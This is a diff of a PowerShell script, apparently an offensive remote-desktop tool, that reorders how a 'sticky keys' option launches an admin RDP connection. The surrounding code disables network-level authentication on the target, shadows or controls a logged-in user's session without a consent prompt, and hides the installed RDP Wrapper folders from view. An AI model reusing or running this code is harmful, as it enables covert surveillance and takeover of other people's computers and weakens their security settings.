@@ -308,8 +308,9 @@ if($Language -in 'Spanish') {
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) ; $RDP = New-PSSession -Computer $computer -credential $credential
    $session = get-pssession ; if ($session){ 
 
-        do { $Host.UI.RawUI.ForegroundColor = 'Gray'  
-        Write-Host "" ; $input = Read-Host -Prompt "$txt19"
+        do { $Host.UI.RawUI.ForegroundColor = 'Gray'
+	if ($stickykeys){ $input = "control" } else {
+        Write-Host "" ; $input = Read-Host -Prompt "$txt19" }
         switch -wildcard ($input) {
 
         'ver' { $control = "false" ; Write-Host "" ;
@@ -347,9 +348,9 @@ if($Language -in 'Spanish') {
         invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host ""
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
         Write-Host "$using:txt25" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } 
-        Write-Host "" ; $shadow = Read-Host -Prompt "$txt26" 
+        Write-Host "" ; $shadow = Read-Host -Prompt "$txt26"
+	if($stickykeys){ mstsc /v $computer /admin /f }
         if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
-	if ($stickykeys){ mstsc /v $computer /admin /f }
         else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
         else { Write-Host "$version $txt27"
@@ -373,9 +374,9 @@ if($Language -in 'Spanish') {
     attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2>&1> $null } 
     
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
-    $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host "" ; Write-Host "$txt25" ; sleep -milliseconds 2000 
+    $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host "" ; Write-Host "$txt25" ; sleep -milliseconds 2000
+    if($stickykeys){ mstsc /v $computer /admin /f }
     if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
-    if ($stickykeys){ mstsc /v $computer /admin /f }
     else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock { 
